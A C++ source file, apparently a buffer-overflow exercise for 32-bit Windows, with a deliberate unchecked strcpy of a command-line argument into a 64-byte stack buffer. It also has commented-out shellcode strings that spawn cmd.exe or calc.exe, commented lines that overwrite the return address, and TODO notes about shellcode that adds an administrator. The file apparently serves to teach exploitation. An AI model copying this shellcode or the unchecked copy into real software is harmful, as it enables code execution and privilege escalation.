// vulnerable.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include<cstdlib>
#include<iostream>
#include<stdio.h>

using namespace std;

int get_ret()
{
	__asm{
		mov eax, [ebp]
		mov eax, [eax+4]
	}
}

int get_val()
{
	__asm{
		mov eax, [ebp]
		mov eax, [eax+4]
		mov eax, [eax]
	}
}

int main(int argc, char *argv[])
{	
	cout << "Before strcpy..." << endl << endl;
	// Cmd.exe
	//char buffer[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x81\xc4\x11\xff\xff\xff\x81\xec\x69\xff\xff\xff\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x0d\x25\x86\x7c\xff\xd3\x31\xc0\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x6d\x64\x2e\x65\x78\x65\x00\x90\x90\x90\x90\x90\x90";
	// Calc.exe
	//char buffer[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x81\xc4\x11\xff\xff\xff\x81\xec\x69\xff\xff\xff\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x0d\x25\x86\x7c\xff\xd3\x31\xc0\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c\x63\x2e\x65\x78\x65\x00\x90\x90\x90\x90\x90";
	
	//TODO: Get return address on the end of the shellcode
	//TODO: Use shellcode for adding administrator
	char buffer[64];

	strcpy(buffer, argv[1]);
	//gets(buffer);

	//*(int *) &buffer[sizeof(buffer)] = (int) &buffer;
	//*(int *) &buffer[sizeof(buffer)+4] = (int) &buffer;
	//*(int *) &buffer[sizeof(buffer)+8] = (int) &buffer;
	//*(int *) &buffer[sizeof(buffer)+12] = (int) &buffer;
	//*(int *) &buffer[sizeof(buffer)+16] = (int) &buffer;
		
	cout << hex << &buffer << endl;
	cout << hex << get_ret() << endl;
	cout << hex << get_val() << endl;
	cout << "Bool: " << ((int) &buffer == get_ret()) << endl;
	cout << "After strcopy..." << endl;
	
	return 0;
}

